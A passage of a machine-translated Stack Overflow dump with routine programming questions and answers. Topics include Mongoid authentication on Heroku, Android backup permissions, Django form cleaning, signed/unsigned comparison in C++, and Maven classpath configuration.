app[web.1]:   @selector={:authenticate=>1, :user=>"heroku", :nonce=>"xyz", :key=>"xyz"}
heroku[router]: POST cool-name-123.herokuapp.com/originals dyno=web.1 queue=0 wait=0ms service=1486ms status=500 bytes=643
app[web.1]:   @fields=nil>
app[web.1]: failed with error "auth fails"):
app[web.1]:   app/controllers/originals_controller.rb:19:in `block in create'
app[web.1]:   app/controllers/originals_controller.rb:18:in `create'
app[web.1]: 
app[web.1]: 
heroku[router]: GET cool-name-123.herokuapp.com/favicon.ico dyno=web.1 queue=0 wait=0ms service=3ms status=304 bytes=0
app[web.1]: 
app[web.1]: 
app[web.1]: Started GET "/" for 212.86.9.90 at 2012-07-31 08:09:40 +0000
heroku[router]: GET cool-name-123.herokuapp.com/ dyno=web.1 queue=0 wait=0ms service=11ms status=304 bytes=0 
```

我最近在 Heroku 上苦苦挣扎，因此我认为我应该有正确的设置来选择数据库驱动程序和服务（在 Gemfile 中使用新的 yml 方案 + Ruby 1.9.3）。

当我跑步时，`heroku config --app app_name`我得到

```
DATABASE_URL        => postgres://rhalppyjrb:xyz@ec2-xyz.compute-1.amazonaws.com/rhalppyjrb
GEM_PATH            => vendor/bundle/ruby/1.9.1
LANG                => en_US.UTF-8
MONGOHQ_URL         => mongodb://heroku:xyz@flame.mongohq.com:27054/app123
PATH                => bin:vendor/bundle/ruby/1.9.1/bin:/usr/local/bin:/usr/bin:/bin
RACK_ENV            => production
RAILS_ENV           => production
SHARED_DATABASE_URL => postgres://rhalppyjrb:xyz@ec2-123.compute-1.amazonaws.com/rhalppyjrb 
```

我的 mongoid.yml 看起来像这样：

```
production:
  sessions:
    default:
          uri: <%= ENV['MONGOHQ_URL'] %>
          options:
            consistency: :strong
            skip_version_check: true
            safe: true 
```

Gemfile 是这样的：

```
source 'https://rubygems.org'

gem 'bundler', '1.2.0.rc'

ruby '1.9.3'

gem 'rails', '3.2.6'
gem 'thin'
gem 'rmagick', :require => 'RMagick'
gem "carrierwave-mongoid", :git => "git://github.com/jnicklas/carrierwave-mongoid.git", :branch => "mongoid-3.0", :require => 'carrierwave/mongoid'

group :assets do
  gem 'sass-rails',   '~> 3.2.3'
  gem 'coffee-rails', '~> 3.2.1'
  gem 'uglifier', '>= 1.0.3'
  gem "therubyracer", :platform => :ruby
end

gem 'jquery-rails'
gem "haml", ">= 3.1.6"
gem "mongoid", ">= 3.0.3"
gem "devise", ">= 2.1.2"
gem "devise_invitable", ">= 1.0.2"
gem "cancan", ">= 1.6.8"
gem "rolify", ">= 3.1.0"
gem "bootstrap-sass", ">= 2.0.4.0"
gem "simple_form"

group :development do
  gem "guard", ">= 0.6.2"
  gem 'rb-fsevent'
  gem 'growl'
  gem "haml-rails", ">= 0.3.4"
  gem "guard-bundler", ">= 0.1.3"
  gem "guard-rails", ">= 0.0.3"
  gem "guard-livereload", ">= 0.3.0"
  gem "guard-rspec", ">= 0.4.3"
end

group :test do
  gem "database_cleaner", ">= 0.8.0"
  gem "mongoid-rspec", "1.4.6"
  gem "email_spec", ">= 1.2.1"
end

group :development, :test do
  gem "factory_girl_rails", ">= 3.5.0"
  gem "rspec-rails", ">= 2.11.0"
end 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-19T11:52:38.857

问题是您的身份验证凭据不再正确。具体来说，您尝试验证的用户不再存在。

原因是当你做的时候`rake db:reseed`所有的数据都被删除了，包括数据库级别的用户。

例子：

```
 ➜  skadi git:(master) ✗ mongo         
  MongoDB shell version: 2.0.7
  connecting to: test
  > use skadi_development
  switched to db skadi_development
  > db.system.users.find()
  > db.addUser("joe", "passwordForJoe")
  { "n" : 0, "connectionId" : 191, "err" : null, "ok" : 1 }
  {
    "user" : "joe",
    "readOnly" : false,
    "pwd" : "dac588613249fe92703afb262ec53b82",
    "_id" : ObjectId("5030d5181cefbd2b04a99e30")
  }
  > db.system.users.find()
  { "_id" : ObjectId("5030d5181cefbd2b04a99e30"), "user" : "joe", "readOnly" : false, "pwd" : "dac588613249fe92703afb262ec53b82" }
  > exit
  bye

  ➜  skadi git:(master) ✗ rake db:reseed

  ➜  skadi git:(master) ✗ mongo         
  MongoDB shell version: 2.0.7
  connecting to: test
  > use skadi_development
  switched to db skadi_development
  > db.system.users.find()
  => Nothing 
```

因此，当您尝试连接到数据库时，您的凭据不再有效。

您可以在 MongoHQ 管理面板中进行检查。您可以通过转到 Heroku，选择您的应用程序，单击资源并单击 MongoHQ 来找到它。然后单击数据库用户选项卡。

`rake db:reseed`以前可以按您的预期工作，但是随着新版本的 mongoid 发生了变化。为了删除除 system.* 之外的所有集合，您可以使用`rake db:purge`.

您可能需要使用 master 分支，因为该 rake 任务在稳定版本中尚不可用。或者只是`Mongoid.purge!`在您的代码中使用，它可以稳定运行。

详情：[https ://github.com/mongoid/mongoid/issues/2275](https://github.com/mongoid/mongoid/issues/2275)

# android - 错误：用户 10066 和当前进程都没有 android.permission.BACKUP

> ID：11735925
> 
> 赞同：1
> 
> 时间：2012-07-31T08:20:40.287
> 
> 标签：android, android-backup-service

我正在开发一个我正在研究 Google Backup API 的 android 应用程序，我阅读了本教程 [http://www.edumobile.org/android/android-development/backup-manager/](http://www.edumobile.org/android/android-development/backup-manager/)

并试图实现它，但它一直在崩溃

Logcat 是

```
07-31 13:39:35.797: E/AndroidRuntime(18279): FATAL EXCEPTION: main
07-31 13:39:35.797: E/AndroidRuntime(18279): java.lang.IllegalStateException: Could not execute method of the activity
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.view.View$1.onClick(View.java:2072)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.view.View.performClick(View.java:2408)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.view.View$PerformClick.run(View.java:8816)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.os.Handler.handleCallback(Handler.java:587)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.os.Handler.dispatchMessage(Handler.java:92)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.os.Looper.loop(Looper.java:123)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.app.ActivityThread.main(ActivityThread.java:4633)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at java.lang.reflect.Method.invokeNative(Native Method)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at java.lang.reflect.Method.invoke(Method.java:521)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:858)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at dalvik.system.NativeStart.main(Native Method)
07-31 13:39:35.797: E/AndroidRuntime(18279): Caused by: java.lang.reflect.InvocationTargetException
07-31 13:39:35.797: E/AndroidRuntime(18279):    at com.pref.BackupManagerExample.onRestoreButtonClick(BackupManagerExample.java:164)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at java.lang.reflect.Method.invokeNative(Native Method)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at java.lang.reflect.Method.invoke(Method.java:521)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.view.View$1.onClick(View.java:2067)
07-31 13:39:35.797: E/AndroidRuntime(18279):    ... 11 more
07-31 13:39:35.797: E/AndroidRuntime(18279): Caused by: java.lang.SecurityException: getCurrentTransport: Neither user 10066 nor current process has android.permission.BACKUP.
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.os.Parcel.readException(Parcel.java:1247)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.os.Parcel.readException(Parcel.java:1235)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.app.backup.IBackupManager$Stub$Proxy.getCurrentTransport(IBackupManager.java:444)
07-31 13:39:35.797: E/AndroidRuntime(18279):    at android.app.backup.BackupManager.requestRestore(BackupManager.java:141)
07-31 13:39:35.797: E/AndroidRuntime(18279):    ... 15 more 
```

而清单是

```
 <?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.pref"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk android:minSdkVersion="8" />
    <uses-permission android:name="android.permission.INTERNET"/>

<uses-permission android:name="android.permission.BACKUP" />
    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" 
         android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
         android:backupAgent="com.pref.BackupManagerExample">
         <activity android:name=".Preff" />

        <activity
            android:name=".PrefrencesActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />

            </intent-filter>
        </activity>

         <meta-data android:name="com.google.android.backup.api_key"
    android:value="AEdPqrEAAAAIo8gaMLEy1sb1bVd6Cyqs5dxPAy8qvFzfILeLWB" />
         <activity
            android:name=".BackupManagerExample"
            android:enabled="true"/>

    </application>

</manifest> 
```

错误在这里

```
 Resotre.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                try {
                    // TODO Auto-generated method stub 
```

// 此行显示错误

```
 mBackupManager.requestRestore(
                                    new RestoreObserver() {
                                        public void restoreFinished(int error) {
                                            Log.v(TAG, "Restore finished, error = " + error);
                                            populateUI();
                                        }
                                    }
                            );
                    } catch (Exception e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }
            }); 
```

此错误的原因可能是什么？我怎样才能删除它？

**编辑**

不是这个，但我也使用了这个代码，

[https://github.com/StylingAndroid/BackupRestore](https://github.com/StylingAndroid/BackupRestore)

只是为了看看备份 API 是如何工作的，这也给出了同样的错误。

```
07-31 18:10:33.226: E/AndroidRuntime(20664): Caused by: java.lang.SecurityException: getCurrentTransport: Neither user 10072 nor current process has android.permission.BACKUP. 
```

从这里我读到

[http://developer.android.com/guide/topics/data/backup.html](http://developer.android.com/guide/topics/data/backup.html)

数据备份不保证在所有 Android 设备上都可用。但是，如果设备不提供备份传输，您的应用程序不会受到不利影响。

我使用的设备是三星 Galaxy Pop。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T00:45:22.047

您正在尝试直接使用 BackupManager，如果没有 android.permission.BACKUP 权限，您将无法这样做。该权限仅授予使用平台密钥签名的应用程序（基本上是系统应用程序）。

您正在清单中请求权限，但如果您在安装时查看日志，您应该会看到您的应用程序的“未授予权限”警告。

所以最后你的代码看起来通常是正确的，但是当你尝试调用受保护的方法时，你只是得到了一个安全异常。

# java - 无法从 Android 连接到 Servlet

> ID：11735927
> 
> 赞同：0
> 
> 时间：2012-07-31T08:20:46.207
> 
> 标签：java, android, servlets

这是我的java代码：

```
 @SuppressLint({ "ParserError", "ParserError" })
  public class MainActivity extends Activity {

 protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
      InputStream is=null;
String result = "";
TextView tv=(TextView)findViewById(R.id.tv);
//the year data to send
ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
nameValuePairs.add(new BasicNameValuePair("name","shrey"));

//http post
 try{
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost("http://10.0.2.2:8081/onlinechat");
      httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

        HttpResponse response = httpclient.execute(httppost);
        HttpEntity entity = response.getEntity();
       is = entity.getContent();

 }
 catch (ClientProtocolException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
} catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
}
//convert response to string
try{
    BufferedReader reader = new BufferedReader(new InputStreamReader(is,"iso-8859-1"),8);
        StringBuilder sb = new StringBuilder();
        String line = null;
        while ((line = reader.readLine()) != null) {
                sb.append(line + "\n");
        }
        is.close();

        result=sb.toString();
        tv.setText(result);

}catch(Exception e){
        Log.e("log_tag", "Error converting result "+e.toString());
}

//parse json data
   /*   try{
          JSONArray jArray = new JSONArray(result);
        for(int i=0;i<jArray.length();i++){
                JSONObject json_data = jArray.getJSONObject(i);
                Log.i("log_tag" , "name: "+json_data.getString("user")

                );
        }

}
 catch (JSONException e)
 {
        Log.e("log_tag", "Error parsing data "+e.toString());
   }
*/

 }

 } 
```

这是我的`Servlet`代码：

```
 public class android extends HttpServlet {

/**
 * Processes requests for both HTTP
 * <code>GET</code> and
 * <code>POST</code> methods.
 *
 * @param request servlet request
 * @param response servlet response
 * @throws ServletException if a servlet-specific error occurs
 * @throws IOException if an I/O error occurs
 */
 protected void processRequest(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    response.setContentType("text/html;charset=UTF-8");
    PrintWriter out = response.getWriter();
   String user=request.getParameter("name").toString();
 /* BufferedReader reader = new BufferedReader( new  InputStreamReader(request.getInputStream() ) );  
                  String res = reader.readLine();  
     while( null != res )  
                   {  
                                         System.out.println( res );  
                            res = reader.readLine();  
                    }  

                  /*InputStream is = new        BufferedInputStream(request.getInputStream());      
        byte[] buf = new byte[8096]; 
            int bytesRead; 
            System.out.println("readbuf "+ is.read( buf )); 
                                while( ( bytesRead = is.read( buf ) ) != -1 )  
                os.write( buf, 0, bytesRead );  */  

    out.print("welcome"+user);
    out.println("success");

 }

  // <editor-fold defaultstate="collapsed" desc="HttpServlet methods. Click on the + sign on the left to edit the code.">
/**
 * Handles the HTTP
 * <code>GET</code> method.
 *
 * @param request servlet request
 * @param response servlet response
 * @throws ServletException if a servlet-specific error occurs
 * @throws IOException if an I/O error occurs
 */
  @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
      processRequest(request, response);
     }

/**
 * Handles the HTTP
 * <code>POST</code> method.
 *
 * @param request servlet request
 * @param response servlet response
 * @throws ServletException if a servlet-specific error occurs
 * @throws IOException if an I/O error occurs
 */
   @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
     processRequest(request, response);
   }

/**
 * Returns a short description of the servlet.
 *
 * @return a String containing servlet description
 */
   @Override
  public String getServletInfo() {
      return "Short description";
   }// </editor-fold>
    } 
```

我在清单中添加了 Internet 权限，但它仍然没有运行。这是调试器解决后我的 logcat

```
07-31 13:45:50.874: E/log_tag(666): Error converting result java.lang.NullPointerException 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:32:28.983

你还没有完成 setcontentView 。所以我认为 tv 在 tv.setText(result); 中为空；在 Oncreate 中做一个 setcontentView

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:47:42.893

我认为您的 URL 仅适用于本地子网，而不适用于世界范围内的子网。检查一次。

# c++ - 正确处理有符号和无符号值的比较

> ID：11735928
> 
> 赞同：9
> 
> 时间：2012-07-31T08:20:49.123
> 
> 标签：c++, c, casting, unsigned, signed

我到了需要比较有符号值和无符号值的地步。到目前为止，我总是修改代码库以完全避免这种情况，但现在我不能这样做。

那么处理有符号和无符号比较的真正正确方法是什么？这是一个混合的 C/C++ 代码库，所以我的问题适用于两种语言。

我正在根据请求的值（未签名）检查资源（已签名）。

```
if (requested > resource.max) return Never;
if (requested > resource.free - resource.assigned) return NotNow;
return Now; 
```

我正在考虑这样的事情（在适用的情况下替换 C++ 变体）：

```
if (requested > (unsigned)INT_MAX) bail_out(); // assert,abort,throw,return....
if ((signed)requested > resource.max) return Never;
if ((signed)requested > resource.free - resource.assigned) return NotNow;
return Now; 
```

我是正确地接近这个，还是有更好的方法？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-31T08:27:16.667

您可以使用此单行代码作为起点来安全地执行此操作：

```
bool GreaterSignedUnsigned( unsigned int u, signed int i )
{
   // calculate the result of (u > i)

   // if i is nonnegative it is safe to compare 2 unsigned values, 
   // otherwise unsigned int is always greater
   return  ( i < 0 ) || ( u > static_cast<unsigned int>(i) );
} 
```

**PS**尽可能避免混合有符号/无符号比较是一种很好的做法，因为额外的比较和强制转换可能会导致性能损失。

# css - 如何为特殊字符指定其他字体

> ID：11735929
> 
> 赞同：0
> 
> 时间：2012-07-31T08:20:52.683
> 
> 标签：css

我正在为我的网站使用 NeuturaRegular 和 Avenir65Medium 字体，但是当我给出`'`符号或任何其他特殊字符时，它会显示为`?`绿色背景，所以我不希望它发生，有人告诉我我们可以指定其他特殊字体，所以任何一个请帮助我....提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:31:58.020

打开[**fontsquirrel.com**](http://www.fontsquirrel.com/fontface/generator)

上传您的字体，然后从单选按钮中选择专家，有一个选项`subsetting`，根据需要使用`customs subsetting`并`characters`从复选框中选择。

并下载@fontface 工具包。

# python - 验证表单集时，Django 意外将字段设置为 None

> ID：11735932
> 
> 赞同：0
> 
> 时间：2012-07-31T08:21:11.217
> 
> 标签：python, django, django-forms, undefined-behavior, django-validation

我正面临着 django 的一个奇怪问题。似乎当我在表单集上运行 is_valid() 时，每个子表单的一个值设置为无。为了检查这一点，我放了两条调试线来打印cleaned_data dict。一个在cleaned_qty() 的末尾，另一个在is_valid() 之后。

这是表格：

```
class ProductsForm(forms.Form):
    product_ref     = forms.CharField(max_length=6, widget=forms.HiddenInput)
    product_name    = forms.CharField(max_length=200, widget=forms.HiddenInput)
    unit            = forms.CharField(max_length=16, widget=forms.HiddenInput)
    qty             = forms.DecimalField(max_digits=6, decimal_places=3,
                        widget=forms.TextInput(attrs={'size': 5}))

    def clean_qty(self):
        data = self.cleaned_data

        if data['qty'] < 0:
            raise ValidationError('La quantité doit être positive')

        unit = Unit.objects.get(pk=data['unit'])

        if not unit.accept_dec and '.' in str(data['qty']) \
        and int(str(data['qty']).split('.')[1]) != 0:
            raise ValidationError('La quantité doit être entière')

        print "!!!" + str(data) + "!!!"

ProductsFormSet = formsets.formset_factory(ProductsForm, extra=0,
    can_delete=True) 
```

这是视图的开始：

```
def cart(request):
    if request.method == 'POST':
        products_formset = ProductsFormSet(request.POST, prefix='products')
        cart_form = CartForm(request.POST, prefix='cart')
        if products_formset.is_valid() and cart_form.is_valid():
            '''
                Create and save the cart
                Send a confirmation email
            '''

            for form in products_formset:
                print "???" + str(form.cleaned_data) + "???" 
```

我提交表单时的结果：

```
DEBUG:django.db.backends:(0.000) SELECT `catalog_unit`.`value`, `catalog_unit`.`plural_val`, `catalog_unit`.`accept_dec` FROM `catalog_unit` WHERE `catalog_unit`.`value` = 'Truc' ; args=(u'Truc',)
!!!{'product_ref': u'BDL233', 'product_name': u'Bidule', 'unit': u'Truc', 'qty': Decimal('2.2')}!!!
DEBUG:django.db.backends:(0.001) SELECT `catalog_unit`.`value`, `catalog_unit`.`plural_val`, `catalog_unit`.`accept_dec` FROM `catalog_unit` WHERE `catalog_unit`.`value` = 'Truc' ; args=(u'Truc',)
!!!{'product_ref': u'MCH024', 'product_name': u'Machin', 'unit': u'Truc', 'qty': Decimal('1.3')}!!!
DEBUG:django.db.backends:(0.000) SELECT `catalog_unit`.`value`, `catalog_unit`.`plural_val`, `catalog_unit`.`accept_dec` FROM `catalog_unit` WHERE `catalog_unit`.`value` = 'Chacal' ; args=(u'Chacal',)
!!!{'product_ref': u'CHO127', 'product_name': u'Chouette', 'unit': u'Chacal', 'qty': Decimal('3')}!!!
???{'DELETE': False, 'product_ref': u'BDL233', 'product_name': u'Bidule', 'unit': u'Truc', 'qty': None}???
???{'DELETE': False, 'product_ref': u'MCH024', 'product_name': u'Machin', 'unit': u'Truc', 'qty': None}???
???{'DELETE': False, 'product_ref': u'CHO127', 'product_name': u'Chouette', 'unit': u'Chacal', 'qty': None}??? 
```

如您所见，唯一的区别是 qty 设置为 None。

我不知道这种行为是从哪里来的。

提前感谢您的光。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:27:04.343

所有`clean_FIELD`方法都*必须*返回正在验证的值。所以你的`clean_qty`方法应该有`return data['qty']`.

# c# - 编辑引用资源的 wpf 代码

> ID：11735934
> 
> 赞同：0
> 
> 时间：2012-07-31T08:21:18.227
> 
> 标签：c#, wpf

我正在尝试在使用 WPF 编写的 c# 表单中编辑源代码，并且在其中不直接声明属性，而是从下面的引用中使用，我从 WPF 表单中放置了一些行。

```
<Grid>
    <StackPanel>
        <Label>
            <LocText ResourceIdentifierKey="CustomerName" Suffix=":"/>
        </Label>
        <TextBox HorizontalAlignment="Left" MinWidth="200" Text="{Binding Name}" />
        <Label>
            <LocText ResourceIdentifierKey="GroupCode" Suffix=":"/>
        </Label>
        <ComboBox HorizontalAlignment="Left" MinWidth="150" Text="{Binding       GroupCode,Mode=TwoWay}"
                  ItemsSource="{Binding GroupCodes}" IsEditable="True"/>
        <Label>
            <LocText ResourceIdentifierKey="PhoneNumber" Suffix=":"/>
        </Label>
        <Common:MaskedTextBox HorizontalAlignment="Left" MinWidth="100" InputMask="{Binding PhoneNumberInputMask}"
             PromptChar=" " UnmaskedText="{Binding PhoneNumber, Mode=TwoWay, UpdateSourceTrigger=LostFocus, ValidatesOnDataErrors=True, ValidatesOnExceptions=True}" />
        <Label>
            <LocText ResourceIdentifierKey="Address" Suffix=":"/>
        </Label>
        <TextBox HorizontalAlignment="Left" MinWidth="200" MinHeight="55" Text="{Binding Address}"
             AcceptsReturn="True" />
        <Label>
            <LocText ResourceIdentifierKey="Note" Suffix=":"/>
        </Label>
        <TextBox HorizontalAlignment="Left" MinWidth="200" MinHeight="55" Text="{Binding Note}"
             AcceptsReturn="True" />
        <CheckBox Margin="0,5,0,0" IsChecked="{Binding InternalAccount}">
            <LocText ResourceIdentifierKey="InternalAccount"/>
        </CheckBox>
        <Button HorizontalAlignment="Left" Margin="0,10" MinWidth="70" Content="{Binding SaveCommand.Caption}"
             Command="{Binding SaveCommand}" />
        <Label Content="{Binding Error}" Foreground="Red" />
    </StackPanel>
</Grid> 
```

如何编辑属性？

例如，我想更改 Lable 的内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T21:08:05.013

很难知道你在问什么——如果你想编辑源代码，只需在 Visual Studio 中加载文件并输入。

如果要在运行时更改 Label 的内容，有两种方法。

一种是使用 Binding 将标签连接到与表单/用户控件关联的 DataContext 对象上的属性。

另一种是给标签一个实际的名称：

```
<Label x:Name="showAccountError Foreground="Red"/> 
```

然后您可以在代码中设置内容：

```
showAccountError.Content = "Sample error"; 
```

# c++ - 有效地将格式化的东西写入文件

> ID：11735936
> 
> 赞同：0
> 
> 时间：2012-07-31T08:21:27.423
> 
> 标签：c++, file-io

我有一个相当大`vector<string>`的内存，我想把每个都`string`写进`./log.txt`，我是这样做的：

```
ofstream ofs("./log.txt");
for (vector<string>::const_iterator cit = vec.begin(); cit != vec.end(); cit++) {
    char buf[30];
    sprintf(buf, "%s\t---@\n", cit->c_str());
    ofs << buf;
}
ofs.close(); 
```

我关心磁盘 I/O 时间，它有效吗？我有更好的主意吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:56:45.213

Here's a hybrid idea, exploiting the fact that you don't really need to format anything:

```
 for ( /* as you have */ )
 {
     ofs.write(cit->c_str(), cit->size());
     ofs.write("\t---@", 5);
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:01:55.047

不要使用 C 绕道。试试明显的

```
ofs << *cit << "\t---@\n"; 
```

这应该比您目前拥有的更快。我怀疑任何合理的手动调整都会比图书馆为你做的更快。可以假设上述内容比您的代码更快的原因：

*   不解析格式化字符串
*   不复制到临时缓冲区
*   不寻找终止`'\0'`，因为 a`std::string`会知道它的长度

最后一点不适用于`"\t---@\n"`尚未；你也可以把它变成a `std::string`，以获得一点点额外的性能。“纯 C++”代码更好的原因还有其他原因：

*   没有缓冲区溢出的危险
*   `'\0'`嵌入数据中的字符没有问题

磁盘 I/O 应该不是问题，因为流是缓冲的。因此，实现将在内存中收集大量这些字符串，然后将它们一次全部写入文件。即便如此，它们也可能会存储在您的操作系统管理的缓存中，以积累更大的块。所以磁盘应该只看到很少的大量写入，这是非常有效的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T09:08:38.513

这是否有效更多地取决于 ofstream 的实现而不是您的代码。这是应该的。如果您需要更高效的 ofstream，您可以实现一个。

但是，正如其他人指出的那样，您的代码是不安全的。您应该改用 C++ 流运算符或方法。

# android - 安卓 4.1 图像视图

> ID：11735941
> 
> 赞同：0
> 
> 时间：2012-07-31T08:21:53.517
> 
> 标签：android

此代码适用于所有版本的 Android，但不适用于 Android 4.1

//我在模拟器上运行它。

图像`img_1.png`存在于文件夹中`/res/drawable/`

```
public void onCreate(Bundle savedInstanceState)
{
super.onCreate(savedInstanceState);

LinearLayout llMain = new LinearLayout(this);
LayoutParams lp = new LayoutParams(LayoutParams.FILL_PARENT, LayoutParams.FILL_PARENT);
llMain.setLayoutParams(lp);

ImageView iv = new ImageView(this);
int resid = getResources().getIdentifier("img_1", "drawable", getPackageName());        
Drawable imageDrw = getResources().getDrawable(resid);
iv.setImageDrawable(imageDrw);                      

    llMain.addView(iv); 

setContentView(llMain);
} 
```

为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T10:01:39.140

以下代码在 4.1 中运行良好

```
relative.setBackgroundResource(getResources().getIdentifier(
            "image", "drawable", "com.package.application")); 
```

所以你可以设置

```
iv.setImageResource(getResources().getIdentifier(
                "image", "drawable", "com.package.application")) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-11T09:12:29.153

我有同样的问题，我通过将图像移动到`drawable-xhdpi`.

在 Android 4.1 中从较小的 dpi 传输图像大小可能存在一些问题。

# facebook-graph-api - Facebook墙贴的最大消息长度是多少

> ID：11735947
> 
> 赞同：5
> 
> 时间：2012-07-31T08:22:21.657
> 
> 标签：facebook-graph-api, sharing, facebook-wall

我在 facebook 墙贴上分享我网站上的消息。该消息的最大长度应该是多少？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-14T12:35:01.590

似乎它有 63206 个字符长。

[http://www.zdnet.com/blog/facebook/facebook-increases-status-update-character-limit-to-63206/5754](http://www.zdnet.com/blog/facebook/facebook-increases-status-update-character-limit-to-63206/5754)

与 Graph-API 相关，以下是已知的限制：

**姓名：**

```
{
  "error": {
    "message": "(#100) name parameter cannot be longer than 1000 characters.", 
    "type": "OAuthException", 
    "code": 100
  }
} 
```

**标题：**

```
{
  "error": {
    "message": "(#100) caption parameter cannot be longer than 1000 characters.", 
    "type": "OAuthException", 
    "code": 100
  }
} 
```

**关联：**

```
{
  "error": {
    "message": "(#100) link too long", 
    "type": "OAuthException", 
    "code": 100
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-20T08:01:59.950

如果消息是状态更新（也就是说，您不包括附件或操作链接），它最多可以包含 420 个字符。否则，如果帖子包含附件或操作链接，则消息最多可包含 10,000 个字符。

[Facebook API：墙上“消息”的最大长度是多少？](https://stackoverflow.com/questions/7141142/facebook-api-what-is-the-max-length-of-message-on-wall)

# email - 将电子邮件的接收连接到 Java 应用程序

> ID：11735948
> 
> 赞同：0
> 
> 时间：2012-07-31T08:22:25.290
> 
> 标签：email, jakarta-mail, postfix-mta, mail-server

我使用 Postfix 和 courier 创建了一个邮件服务器，并为许多客户自动创建了虚拟电子邮件地址，因此我使用 mysql 数据库来存储这些虚拟电子邮件以将它们连接到 postfix。我要做的是使用 java mail 向外部地址发送电子邮件，我还没有尝试过。（我不确定这个选择，如果您有其他建议，请告诉我）。

而我现在的问题是，如何将接收电子邮件（内容、发件人..）依赖于 java 程序，以向每个客户显示例如电子邮件的消息/内容。请问有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T17:27:59.477

除了上面的 procmail 建议之外，您还可以将消息传递到邮箱并让您的 JavaMail 问题轮询邮箱以获取新到达的消息。IMAP IDLE 命令可以使轮询相对快速和有效，但它确实需要与保持打开的邮件服务器的连接。

# maven - 将命令行参数添加到 maven exec 插件

> ID：11735949
> 
> 赞同：4
> 
> 时间：2012-07-31T08:22:26.123
> 
> 标签：maven, maven-plugin

我正在尝试使用 exec:exec 目标使用 maven exec 插件运行 java 程序。
我需要在类路径中添加一个额外的 jar（sun 工具 jar）。
由于 includePluginDependencies 仅适用于 exec:java 目标，我想在参数部分手动添加它，但找不到将其连接到基类路径的方法。问题是由于jar被定义为系统范围，maven不会将它添加到运行时类路径中，我需要手动添加它。
如果有人知道如何从命令行执行此操作，那就更好了。提前致谢，
阿夫纳

*   您可以在下面看到插件部分

    ```
     <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>exec-maven-plugin</artifactId>
            <version>1.2.1</version>
            <dependencies>
                <dependency>
                    <groupId>com.sun</groupId>
                    <artifactId>tools</artifactId>
                    <scope>system</scope>
                    <systemPath>${JDK_HOME}/lib/tools.jar</systemPath>
                </dependency>
                <dependency>
                    <groupId>${project.groupId}</groupId>
                    <artifactId>myArtifact</artifactId>
                    <version>1.0</version>
                </dependency>
            </dependencies>
            <configuration>
                <executable>java</executable>
                <arguments>
                    <argument>-classpath</argument>
                    <classpath/>                        
                    <argument>com.mycompany.MyMainClass</argument>
                </arguments>
            </configuration>
            <executions>
                <execution>
                    <goals>
                        <goal>exec</goal>
                    </goals>
                </execution>
            </executions>
        </plugin> 
    ```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-09T07:18:20.370

最终我决定使用 maven-antrun-plugin 所以这里是一个可能的替代解决方案。

```
<configuration>
<target>
    <property name="runtime_classpath" refid="maven.runtime.classpath"/>

    <java classname="com.mycompany.MyClass"
            fork="true"
            spawn="false"
            failonerror="true"
            maxmemory="512m" >

        <classpath>
            <pathelement path="${runtime_classpath}" />
            <pathelement path="${JDK_HOME}/lib/tools.jar" />
        </classpath>
        <arg value="${ant.param1}" />
